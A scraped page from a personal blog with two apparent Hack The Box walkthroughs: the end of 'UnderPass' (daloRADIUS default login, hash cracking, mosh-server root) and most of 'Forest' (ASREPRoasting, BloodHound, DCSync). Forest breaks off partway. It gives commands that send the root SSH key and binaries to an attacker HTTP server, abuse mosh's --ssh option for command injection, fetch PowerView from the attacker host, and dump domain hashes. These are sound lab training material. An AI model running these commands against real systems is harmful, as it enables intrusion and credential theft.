.idea/ *.log *.db invoice_preview.html .DS_Store data/ internal_data/ var/log/*.log var/backup/*.sql app/common/includes/daloradius.conf.php app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/* I wonder why invoice_preview.html is on there &#x1f914;
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/daloradius/FUZZ -t 60 -ic -c -timeout 4 -r -e &#39;.php&#39; -mc all -fs 275 Hmm, and now a LICENSE file, eh? Definitely painting a picture of a whole git repo now.
Let&rsquo;s dive deeper into the /daloradius/app directory. If there&rsquo;s anything to interact with, I bet it&rsquo;s in there:
ffuf -w $WLIST:FUZZ -u http://$DOMAIN/daloradius/app/FUZZ -t 60 -ic -c -timeout 4 -r -e &#39;.php&#39; -mc all -fs 275 Oh, very interesting! The /daloradius/app/users page redirects to a login page:
Better yet, the /daloradius/app/operators page also redirects to a login page:
From here, we can see they&rsquo;re running daloRADIUS 2.2 beta.
FOOTHOLD Why is it so great that we found the operators login? Because we already saw some default credentials (administrator : radius) earlier when checking the daloradius documentation &#x1f601;
Let&rsquo;s try them out:
Nice! Login was successful on the first guess. Gotta love that! &#x2764;&#xfe0f;
daloRADIUS Dashboard Database Settings: Under Config &gt; Database Settings we can see all kinds of useful info. Maybe we can&rsquo;t access the database directly yet, but I&rsquo;m sure we will see it by the end of the box:
We can also see from Reports &gt; Service Status that this daloRADIUS instance is running:
FreeRADIUS MariaDB SSHd &#x1f44d; Now we have some things to look for once we gain RCE
Users Listing Right from the home/main page of the dashboard, we see that there is conspicuously 1 user. Checking out the users list, we a username and (hopefully) a plaintext password:
Ok, that&rsquo;s svcMosh : 412DD4759978ACFCC81DEAB01B382403.
May as well check that credential for reuse on SSH, while I&rsquo;m looking at it.
ssh svcMosh@$RADDR # 412DD4759978ACFCC81DEAB01B382403 Nope! No login from that.
The form claims that that plaintext should be entered onto this form, and then the system will take care of any hashing. But honestly, this is exactly the length and format of an md5 hash&hellip; so maybe the system has already hashed it, and we&rsquo;re seeing the result of that?
For a quick win, let&rsquo;s toss it into https://crackstation.net and see what happens:
We get a result immediately: underwaterfriends &#x1f420;
Let&rsquo;s try that in SSH:
ssh svcMosh@$RADDR # underwaterfriends &#x1f44f; Wonderful! We have SSH already. This is going quickly!
USER FLAG The SSH connection drops us into /home/svcMosh, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Local enumeration: svcMosh I&rsquo;ll take a look around as svcMosh and see what is available. Right away, sudo -l reveals a likely privesc vector:
sudo -l # User svcMosh may run the following commands on localhost: # (ALL) NOPASSWD: /usr/bin/mosh-server a quick check to the parent directory shows that there are a couple of related files, too:
Also, we can see some listening ports that didn&rsquo;t turn up in our nmap scans:
netstat -tulpn Unsurprisingly, we see MariaDB, SSH, HTTP, and SNMP, but now we can also see UDP ports 1812 and 1813 (RADIUS) and 18120, which is probably a locally-running (or maybe dev copy) of the RADIUS server.
I think it&rsquo;s definitely worth forwarding a few ports for this one. Normally I&rsquo;d just use SSH -L forward these ports, but on this target we have some UDP traffic (which SSH doesn&rsquo;t handle natively).
So instead, I&rsquo;ll use chisel I&rsquo;ll use an HTTP server to transfer a precompiled copy of chisel to the target. I&rsquo;ll need to open a port for HTTP, and also for chisel:
I&rsquo;m using my simple-http-server, available at my github repo. It&rsquo;s basically just an extension of Python&rsquo;s http.server
cp ~/Tools/STAGING/chisel . sudo ufw allow from $RADDR to any port 8000,9999 proto tcp simple-server 8000 -v Then, from the target, download chisel:
mkdir -p /tmp/.Tools &amp;&amp; cd /tmp/.Tools wget http://10.10.14.21:8000/chisel Chisel SOCKS Proxy &#x1f6ab; In retrospect, there&rsquo;s no reason to proxy any ports. If you&rsquo;ve never done it, go ahead and try for learning&rsquo;s sake. If you&rsquo;re short on time, skip ahead to the privesc.
On the attacker box, just start up chisel in server mode:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.21:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test (attacker -&gt; target -&gt; attacker) to access loading the index page from my local python webserver hosting my toolbox:
proxychains whatweb http://10.10.14.21:8000 whatweb shows the details of my toolbox&rsquo;s HTTP server, so the round-trip check looks good &#x1f44d;
MySQL &#x1f6ab; In retrospect, there&rsquo;s nothing of note in the DB. If you want to learn about using proxychains to access a database, go ahead and try for learning&rsquo;s sake. If you&rsquo;re short on time, skip ahead to the privesc.
Now that the chisel proxy is open, we can check out the database contents. We&rsquo;ll use the credentials we found earlier in the doloRADIUS dashboard (steve : testing123):
proxychains mysql -h 127.0.0.1 -u steve -p # testing123 I took a look around the radius database. Unfortunately, it doesn&rsquo;t seem to have anything important inside, and steve is the only user mentioned.
mosh First, let&rsquo;s upload copies of each of those interesting files from /usr/bin:
curl -X POST -F &#34;file=@/usr/bin/mosh&#34; http://10.10.14.21:8000 curl -X POST -F &#34;file=@/usr/bin/mosh-client&#34; http://10.10.14.21:8000 curl -X POST -F &#34;file=@/usr/bin/mosh-server&#34; http://10.10.14.21:8000 The perl script (mosh) reveals some interesting info about this system. If I had to sum it up, this mosh things seems to basically be a wrapper for SSH that allows UDP.
We have two binaries and a perl script, so let&rsquo;s set them as executable:
chmod +x ./mosh* However, when I try to run the script on my attacker machine, I get a syntax error:
syntax error at ./mosh line 531, at EOF Execution of ./mosh aborted due to compilation errors.
Examining this line, it looks like some garbage was inserted at the end of the file (intentionally?):
Just trim the last line off the file, and it runs fine. Since mosh-client is not in the PATH we need to specify its location manually:
./mosh --client=./mosh-client $RADDR However, it seems we&rsquo;re missing a library, libprotobuf.so.23, so I&rsquo;ll upload it from the target and put it onto my attacker host:
curl -X POST -F &#34;file=@//usr/lib/x86_64-linux-gnu/libprotobuf.so.23&#34; http://10.10.14.21:8000 sudo mv ./libprotobuf.so.23 /usr/lib/x86_64-linux-gnu/libprotobuf.so.23 &#x261d;&#xfe0f; l&rsquo;ll have to remember to delete this later.
Great, now let&rsquo;s try running the mosh-server on the target and connecting to it from the attacker host:
sudo /usr/bin/mosh-server ./mosh --client=./mosh-client svcMosh@$RADDR # use password: underwaterfriends I was right; it looks exactly like SSH. Maybe the program has some unsafe args?
Actually, yeah, the --ssh argument seems really unsafe. Looks like they practically wrote it with command injection in mind!
--ssh=COMMAND ssh command to run when setting up session (example: &#34;ssh -p 2222&#34;) (default: &#34;ssh&#34;) I still have my HTTP server running, so let&rsquo;s use that as a blind command injection endpoint.
We also have an SSH connection as svcMosh already open, so a perfectly good alternative would have been to just touch a file.
./mosh --client=./mosh-client --ssh=&#39;curl http://10.10.14.21:8000/injected&#39; svcMosh@$RADDR Checking the HTTP server, we see that the cURL request occurred &#x1f911;
That&rsquo;s great &#x1f605; But then I accidentally tried to run mosh on my attacker system and&hellip; it prompted me to install mosh from the package manager - so this mosh thing is actually a registered package, not some custom homebrew app for the box &#x1f62e;
And if that&rsquo;s the case, maybe there&rsquo;s documentation. I went ahead and installed mosh on my attacker host and checked for man pages:
# All of these man-pages exist! man mosh man mosh-server man mosh-client Fantastic, now we have a lot more visibility on how this all works. Basically, my previous approaches would never have worked for privesc, because of this (from man mosh-client):
mosh itself is a setup script that establishes an SSH connection, runs the server-side helper mosh-server, and collects the server&rsquo;s port number and session key.
Aha! So when I ran mosh and authenticated as svcMosh, it was completely ignoring my previous sudo /usr/bin/mosh-server invocation on the target - it was running a fresh process of mosh-server as the authenticated user (svcMosh).
The man pages make mosh sound more like a convenience thing than anything, so can we just omit it? I&rsquo;ll run an elevated mosh-server on the target:
&#x1f447; I&rsquo;m only specifying the port for repeatability. It can be any free UDP port 60000-61000.
sudo /usr/bin/mosh-server -p 60999 It generates a key for us, which we pass to mosh-client using an environment variable (as per the documentation). Copy the key and paste it into the terminal on our attacker host, to use with mosh-client:
MOSH_KEY=&#34;OV5NVfwe9FCBjC5Rc+wJEQ&#34; ./mosh-client $RADDR 60999 &#x1f639; And&hellip; there is is! An SSH connection as root opens:
That was super easy, once I realized there was documentation! &#x1f601;
The root flag is in the usual spot. Go ahead and read it for the points:
cat /root/root.txt EXTRA CREDIT Persistence - SSH key Since this box had a fair bit to do with SSH, it seemed right to finish it off by swiping the root SSH private key.
&#x1f6a8; ​OPSEC moment: Sending an SSH key over an HTTP connection would be bad news if there was any kind of monitoring on this network. Doing this is sure to raise some red flags. Even base64-encoding it would be a slight improvement.
The private key id_rsa is in the usual spot, and I&rsquo;m still running my HTTP server, so let&rsquo;s just upload it:
cd /root/.ssh curl -X POST -F &#39;file=@./id_rsa&#39; http://10.10.14.21:8000 Great, now let&rsquo;s take the uploaded key, set the right permissions on it, and open up a fresh SSH connection that doesn&rsquo;t depend on mosh:
mv www/id_rsa loot/id_rsa chmod 600 loot/id_rsa ssh -i loot/id_rsa root@$RADDR &#x1f609; Now there&rsquo;s no need to re-exploit if we want to play around as root.
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools It&rsquo;s probably also good to close chisel:
pkill chisel Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
sudo rm /usr/lib/x86_64-linux-gnu/libprotobuf.so.23 sudo apt remove mosh It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f407; Always check the quick-start guide. It&rsquo;s not that people are inherently lazy&hellip; just short on time! Blindly following a quick-start guide is very common. Also, people tend to tune out once they get the product running, and fail to follow the last 10% of the quick-start guide that tells you to change your default passwords.
&#x1f4e1; Mosh might actually be really useful. I have a few applications where I need to hop between different network interfaces, and it would be pretty cool if I could somehow keep an SSH connection alive the whole time.
&#x1f643; Read the friendly manual. While the privesc was pretty quick on this box, I could have arrived at the right method a lot sooner if I had just checked the man pages earlier.
Defender &#x1f512; Always change the password. We got into the daloRADIUS Operators dashboard by using default credentials. Leaving your production, internet-connected system running with default credentials is like putting up a giant neon &ldquo;hack me&rdquo; sign.
&#x1f511; Use SSH keys instead of passwords. In my opinion, this is below what I would consider the baseline of security practices. On this box, we got an SSH connection by &ldquo;cracking&rdquo; a weak password hash: this would have been an impossible task if the dashboard was instead just used for entering SSH public keys, and the private key remained held by the user. This simple change can make a big difference to security.
&#x1f411; Be careful with unnecessary permissions. On this box, svcMosh was able to sudo mosh-server. Why? What could be the point of that? It would have been much better to actually think about the use-case for svcMosh to have elevated permissions, and create SUID binaries for just those specific tasks.
`,url:"https://4wayhandshake.github.io/walkthrough/underpass/"},"https://4wayhandshake.github.io/walkthrough/forest/":{title:"Forest",tags:["Active Directory","ASREPRoasting","Password Cracking","PowerView","Bloodhound","dacledit","DCSync","Secretsdump.py","Passing the Hash"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Forest is 100% Active Directory. If you&rsquo;re like me, a box with no webserver and only AD is a bit like staring at a blank wall - it&rsquo;s hard to know where to start with enumeration. Forest is fantastic practice to break you out of that mindset, and help understand good methods for attacking AD environments.
Recon mostly consists of going through checklists of ways to enumerate active directory in an unauthenticated manner. It helps a lot to know a few good methods to try, and see how far that gets you. Forest was all about being methodical and knowing when you&rsquo;ve found something useful. The only thing we really need to realize during recon is that Kerberos preauthentication is disabled.
Foothold (and, immediately, the user flag) are totally trivial if you found the right things during recon: what attack becomes possible once we know that Kerberos preauthentication is disabled on a certain account? That&rsquo;s right - ASREPRoasting! Grab the hash for the vulnerable user and crack it for some credentials.
With credentials in-hand, we can log in (and grab the user flag) but we can also enumerate the AD environment much more effectively. Applying Bloodhound we can observe that there is a misconfiguration in the way that some groups are set up, eventually leading us to the ability to gain DCSync privileges, and dump the hashes on the host. From there, we can simply pass-the-hash to log in as Administrator.
Forest was very good practice. I&rsquo;d highly recommend it to anyone that wants a relatively quick box for brushing up on Active Directory attacks &#x1f44d;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49668/tcp open unknown 49671/tcp open unknown 49676/tcp open unknown 49677/tcp open unknown 49684/tcp open unknown 49706/tcp open unknown 49961/tcp open unknown No website - that&rsquo;s interesting. Definitely an Active Directory box though.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-25 08:52:37Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49677/tcp open msrpc Microsoft Windows RPC 49684/tcp open msrpc Microsoft Windows RPC 49706/tcp open msrpc Microsoft Windows RPC 49961/tcp open msrpc Microsoft Windows RPC Host script results: | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2024-10-25T01:53:34-07:00 | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 2h32m35s, deviation: 4h02m32s, median: 12m33s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-time: | date: 2024-10-25T08:53:30 |_ start_date: 2024-10-25T05:45:58 I&rsquo;ll fix the clock skew when I need to, using faketime.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No additional info from this scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR PORT STATE SERVICE VERSION 53/udp open domain Simple DNS Plus 88/udp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-25 08:56:36Z) 123/udp open ntp NTP v3 LDAP Enumeration - Unauthenticated Domain details ldapsearch -x -H &#34;ldap://$RADDR&#34; -s base namingcontexts This just confirms what nmap already told us. Next let&rsquo;s dump LDAP for all info, so we can parse through it using grep:
ldapsearch -x -H &#34;ldap://$RADDR&#34; -b &#34;DC=htb,DC=local&#34; | tee ldap-anonymous.out We can get a feel for what object classes exist in the domain:
grep -i &#39;objectclass&#39; ldap-anonymous.out | awk &#39;{print $2}&#39; | sort -u User enumeration Looking at the output of the previous command, we can note two interesting object classes: person and user. Let&rsquo;s query for all user objects:
ldapsearch -x -H &#34;ldap://$RADDR&#34; -b &#34;DC=htb,DC=local&#34; &#39;(objectClass=user)&#39; | tee ldap-anonymous-users.out This contains service accounts, and other MS Exchange junk, so let&rsquo;s filter it out:
grep -i &#39;samaccountname&#39; ldap-anonymous-users.out \\ | awk &#39;{print $2}&#39; | sort -u \\ | grep -ivE &#39;^HealthMailbox|^SM_|DefaultAccount|Guest|\\$$|^\\$&#39; \\ | tee users.lst andy lucinda mark santi sebastien &#x1f440; Looks like a perfectly normal list of users now.
Anonymous Authentication Using crackmapexec we can rapidly check for anonymous authentication on a few services:
for SVC in ftp rdp smb mssql ldap winrm ssh; do echo &#34;Checking $SVC for anonymous authentication...&#34;; crackmapexec $SVC $RADDR -u &#39;&#39; -p &#39;&#39;; done Let&rsquo;s try listing the directories for SMB:
smbclient -L \\\\\\\\$RADDR --no-pass Anonymous authentication was successful, but there are no directories.
FOOTHOLD ASREPRoast Another easy unauthenticated attack to check for is ASREPRoasting. We can easily check this using the GetNPUsers.py utility from impacket-tools
It&rsquo;s always good to check for other attacks we can perform anonymously. Active Directory has such a vast attack surface that we should check for vulnerabilities like this even if there&rsquo;s nothing really prompting us to do so.
ASREPRoasting has two preconditions:
We can communicate with the domain controller (yes, htb.local is the DC) At least one user has Kerberos preauthentication disabled. This is exactly what GetNPUsers.py checks. GetNPUsers.py -dc-ip $RADDR &#39;htb.local/&#39; &#x261d;&#xfe0f; Note the weird syntax. If you don&rsquo;t state the target in domain/[user] format, it will complain at you:
[-] Domain should be specified! Avoid this by adding a trailing slash to the domain (the target)
&#x1f914; Huh, weird. That&rsquo;s not one of the users we found earlier&hellip; checking back through my LDAP dump, this isn&rsquo;t a user at all; it&rsquo;s a service account, but it doesn&rsquo;t have objectType of user.
We can add to this command a little to get the hash from the AS-REP that Kerberos replies with (iirc, this contains a hashed copy of the credential, packaged together with a timestamp - basically acting as a nonce):
GetNPUsers.py -dc-ip $RADDR &#39;htb.local/&#39; -request -format hashcat And there it is! We&rsquo;ve just obtained a hash for svc-alfresco@HTB.LOCAL. I&rsquo;ll copy-paste this into a new file called asrep.hash.
It&rsquo;s already in a format suitable for hashcat, but I&rsquo;ll need to check exactly what hashcat mode to use&hellip;
hashcat --example-hashes | grep -i &#39;$krb5asrep&#39; -B 12 -A 8 Perfect - let&rsquo;s try mode 18200 and just throw rockyou at it:
WLIST=/usr/share/wordlists/rockyou.txt hashcat -m 18200 asrep.hash $WLIST After a few seconds, we&rsquo;ve cracked the hash:
Excellent - we now have a full credential: svc-alfresco : s3rvice. This opens up a lot of opportunities for enumeration for us.
Credential stuffing We&rsquo;ve obtained one credential, but maybe the password will work for other accounts too? Thankfully, this is really easy to check just by using crackmapexec again.
I&rsquo;ll and svc-alfresco to the users.lst file, and try all the &ldquo;users&rdquo; for each service, using the password s3rvice for each attempt:
echo &#34;svc-alfresco&#34; &gt;&gt; users.lst for SVC in ftp rdp smb mssql ldap winrm ssh; do echo &#34;Checking $SVC for valid creds...&#34;; crackmapexec $SVC $RADDR -u users.lst -p &#39;s3rvice&#39;; done &#x1f44f; Although there was no credential re-use, we did find that svc-alfresco has access to both SMB and winrm!
USER FLAG SMB - authenticated It&rsquo;s tempting to just dive straight into WinRM, but let&rsquo;s check SMB first:
smbclient -L \\\\\\\\$RADDR -U &#39;htb.local/svc-alfresco%s3rvice&#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Nothing out of the ordinary there.
WinRM Thankfully, the credential for svc-alfresco grants us a shell on the target, since they can access WinRM:
evil-winrm -i $RADDR -u svc-alfresco -p s3rvice Unexpectedly, svc-alfresco holds the user flag. type it out for some points.
ROOT FLAG Bloodhound Since we have a valid user for AD, we should expedite our enumeration by using Bloodhound. I&rsquo;ll use the python one. The syntax is really particular, so be careful here.
Also note that the domain controller must be resolvable by your /etc/hosts, so add it there:
echo &#34;$RADDR htb.local&#34; | sudo tee -a /etc/hosts bloodhound-python -ns $RADDR -d &#39;htb.local&#39; -dc &#39;htb.local&#39; -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39; -c All Initial attempts at this seem to work, but I was still getting an odd warning:
DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) That&rsquo;s odd. Let&rsquo;s try fixing that. Normally I&rsquo;d use faketime for this, but it wasn&rsquo;t working either.
sudo timedatectl set-ntp off # disable automatic time adjustments sudo rdate -n $RADDR # Syncs our clock with the target&#39;s bloodhound-python -ns $RADDR -d &#39;htb.local&#39; -dc &#39;htb.local&#39; -u &#39;svc-alfresco&#39; -p &#39;s3rvice&#39; -c All &#x2b50; Perfect - no more warning! We now have a directory full of json files:
I&rsquo;ll start up the backend for Bloodhound (neo4j), and Bloodhound itself:
For more details on setting up neo4j, check out this section of my walkthrough on Freelance.
neo4j bloodhound I accidentally left Bloodhound full of data from a previous box. To delete it, use the web interface at http://localhost:7474/browser/ then run this query:
MATCH (n) DETACH DELETE n Now that the old data is deleted, &ldquo;Upload&rdquo; all the json files:
The files uploaded fine. Once everything was loaded, I marked svc-alfresco as &ldquo;owned&rdquo; then used the query Shortes paths to Domain admins from owned principals:
The MemberOf and Contains relationships are implicit - we don&rsquo;t need to do anything to utilize them. However, the other two will require some action:
&#x1f447; To get this info, I&rsquo;m right-clicking on the relationship in the graph and choosing &ldquo;Help&rdquo;
CanPsRemote:
members of the group PRIVILEGED IT ACCOUNTS@HTB.LOCAL have the capability to create a PSRemote Connection with the computer FOREST.HTB.LOCAL
DCSync:
FOREST.HTB.LOCAL has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All privilege on the domain HTB.LOCAL.
These two privileges allow a principal to perform a DCSync attack.
Excellent - that gives us a really good plan for privilege escalation!
PSRemote Connection &#x1f6ab; This didn&rsquo;t lead anywhere. If you&rsquo;re short on time, feel free to skip ahead to where I get back on track.
Let&rsquo;s keep following along according to the Help &gt; Abuse Info section from Bloodhound:
You may need to authenticate to the Domain Controller as a member of PRIVILEGED IT ACCOUNTS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with New-PSSession, first create a PSCredential object
As svc-alfresco, we&rsquo;ll make a new powershell session. First we will need to authenticate:
# Securely make the credential: $SecPassword = ConvertTo-SecureString &#39;s3rvice&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;svc-alfresco&#39;, $SecPassword) # Check that it was made properly: $Cred.GetType() # it should show that it&#39;s of type PSCredential # Authenticate using this credential: $session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred # Check that you authenticated properly: hostname Very good; we&rsquo;re now logged into the machinge forest.htb.local. We can run commands explicitly through this session like this:
Invoke-Command -Session $session -ScriptBlock {Start-Process cmd} Remember - when we&rsquo;re done with this session, we should be sure to clean it up:
Disconnect-PSSession -Session $session Remove-PSSession -Session $session DCSync Attack &#x1f6ab; This didn&rsquo;t lead anywhere. If you&rsquo;re short on time, feel free to skip ahead to where I get back on track.
To perform the DCSync attack, we can simply use another one of the utilities from Impacket,secretsdump.py:
secretsdump.py &#39;HTB.LOCAL/svc-alfresco:s3rvice@10.10.10.161&#39; secretsdump.py -dc-ip $RADDR &#39;svc-alfresco:s3rvice@10.10.10.161&#39; secretsdump.py -dc-ip $RADDR -target-ip $RADDR &#39;svc-alfresco:s3rvice&#39; Uh&hellip; I must be doing something wrong &#x1f914; Maybe the assumption about PSRemote connection was incorrect? Let&rsquo;s go back to Bloodhound and consider other options.
Revising the Attack Path In Bloodhound, we can consider other options than just the shortest path (i.e. the one we tried earlier: PSRemote + DCSync). This time, let&rsquo;s select Shortest Paths to Domain Admins.
Take a look at the placement of the high-value targets - there is another notable path along the top, not the shortest path, but it still gets us to Administrator. All we need to do is realize that we can get to Account Operators from svc-alfresco implicitly:
To see this, right click on Account Operators and select Shortest Paths to Here from Owned
This implicit connection opens up a whole new path for us:
Ultimately, this boils down to finding a way to get ourselves the WriteDacl privilege that EXCHANGE WINDOWS PERMISSIONS has.
GenericAll Bloodhound describes GenericAll as follows:
Info ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.* *This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.
Windows Abuse There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group &ldquo;Domain Admins&rdquo; harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe
Now we make some fresh credentials:
For more details, check out the Powersploit documentation
$SecPassword = ConvertTo-SecureString &#39;Password123&#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;jimbob&#39;, $SecPassword) &#x1f914; I first tried to make a fresh user the Powershell way, but for some reason it would not work:
New-ADUser -SamAccountName &#34;jimbob&#34; -UserPrincipalName &#34;jimbob@htb.local&#34; -Path &#34;OU=Users,CN=htb,CN=local&#34; -AccountPassword $SecPassword So I resorted to doing it the old / cmd way.
net user jimbob Password123 /add Now we can add jimbob into the group Exchange Windows Permissions, so that they implicitly have WriteDacl privilege over HTB.LOCAL:
Add-ADGroupMember &#39;Exchange Windows Permissions&#39; -members &#39;jimbob&#39; This could also have been done using the cmd command:
net group &#34;Exchange Windows Permissions&#34; /add jimbob WriteDacl Here&rsquo;s what Bloodhound says about the WriteDacl relationship:
Info The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL With write access to the target object&rsquo;s DACL, you can grant yourself any privilege you want on the object.
Linux abuse To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. Impacket&rsquo;s dacledit can be used for that purpose (cf. &ldquo;grant rights&rdquo; reference for the link).
dacledit.py -action &#39;DCSync&#39; -rights &#39;FullControl&#39; -principal &#39;controlledUser&#39; -target-dn &#39;DomainDisinguishedName&#39; &#39;domain&#39;/&#39;controlledUser&#39;:&#39;password&#39; Note that there are many other ways to abuse WriteDacl for privilege escalation. Here&rsquo;s a really good mind-map for visualizing attack paths for overly permissive AD environments, from www.thehacker.recipes:
In short, we&rsquo;re using WriteDacl as a way to lead to DCSync, which in turn leads us to a way to dump the hashes (secretsdump.py or mimikatz).
impacket-dacledit Let&rsquo;s do as Bloodhound says, and use impacket-dacledit to write DCSync privilege onto our custom user, jimbob:
impacket-dacledit -action &#39;write&#39; -rights &#39;FullControl&#39; -principal &#39;jimbob&#39; -target-dn &#39;DC=HTB,DC=LOCAL&#39; &#39;HTB.LOCAL&#39;/&#39;jimbob&#39;:&#39;Password123&#39; Note that we just applied FullControl, which contains DCSync. We could have specified only DCSync if we wanted to.
That appears to have worked, but just to check, let&rsquo;s use svc-alfresco and PowerView and read the privileges that jimbob has:
# Download Powerview from my attacker-controlled http server (New-Object Net.WebClient).DownloadFile(&#34;http://10.10.14.17:8000/powerview.ps1&#34;, &#34;C:\\Users\\svc-alfresco\\Downloads\\powerview.ps1&#34;) # Load PowerView into memory Import-Module &#34;C:\\Users\\svc-alfresco\\Downloads\\powerview.ps1&#34; To check our work, we can use another PowerView cmdlet:
Get-ObjectACL -SamAccountName &#34;jimbob&#34; -ResolveGUIDs Note that we could have also done this by using PowerView (or by using regular powershell):
# Create a credential object $SecPassword = ConvertTo-SecureString &#39;Password123&#39;-AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&#39;HTB.LOCAL\\jimbob&#39;, $SecPassword) # Grant jimbob the DCSync privilege Add-DomainObjectAcl -TargetIdentity &#34;dc=HTB,dc=LOCAL&#34; -PrincipalIdentity &#39;HTB.LOCAL\\jimbob&#39; -Rights &#34;DCSync&#34; -Credential $Cred -Verbose Under the Linux Abuse section for WriteDacl, Bloodhound describes how we can leverage DCSync:
DCSync The AllExtendedRights privilege grants EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain HTB.LOCAL.
This can be abused using Impacket&rsquo;s secretsdump.py example script:
secretsdump &#39;DOMAIN&#39;/&#39;USER&#39;:&#39;PASSWORD&#39;@&#39;DOMAINCONTROLLER&#39; In this way, once we have DCSync we can obtain hashes NTLM hashes for any user. We&rsquo;ll follow Bloodhound&rsquo;s instructions to do this:
secretsdump.py -outputfile &#39;secretsdump&#39; &#39;HTB.LOCAL/jimbob:Password123@10.10.10.161&#39; This should produce three files, but what we need is inside secretsdump.ntds:
